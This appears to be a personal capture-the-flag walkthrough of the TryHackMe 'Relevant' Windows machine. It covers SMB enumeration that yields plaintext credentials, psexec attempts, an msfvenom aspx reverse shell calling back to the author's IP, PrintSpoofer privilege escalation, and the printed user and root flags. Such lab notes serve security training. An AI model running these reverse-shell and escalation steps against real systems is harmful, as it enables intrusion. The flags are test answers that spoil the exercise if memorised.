# Relevant 

> VOiD | Sunday 28 November 2021 10:40:54 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.139.172


## 139 [SMB]
```bash
smbclient -L 10.10.139.172
Enter WORKGROUP\void's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available

smbclient \\\\10.10.139.172\\nt4wrksv
Enter WORKGROUP\void's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020


Creds :
	Bob - !P@$$W0rD!123  
	Bill - Juw4nnaM4n420696969!$$$ 

Checking for valid creds
psexec.py bob:'!P@$$W0rD!123'@10.10.139.172
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.139.172.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file alqbUXvs.exe
[*] Opening SVCManager on 10.10.139.172.....
[-] Error opening SVCManager on 10.10.139.172.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager

psexec.py Bill:'Juw4nnaM4n420696969!$$$'@10.10.139.172
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[-] Authenticated as Guest. Aborting


```


## PORT 49663
```bash
http://10.10.139.172:49663/nt4wrksv/passwords.txt
this is the same share nt4wrksv

now we have to Upload a reverse shell 
IIS needs aspx shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.253.221 LPORT=4444 -f aspx -o rev.aspx 

http://10.10.78.8:49663/nt4wrksv/rev.aspx
```

## USER [iis]
```bash
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled



SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
This is vuln for printspoofer

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}

```
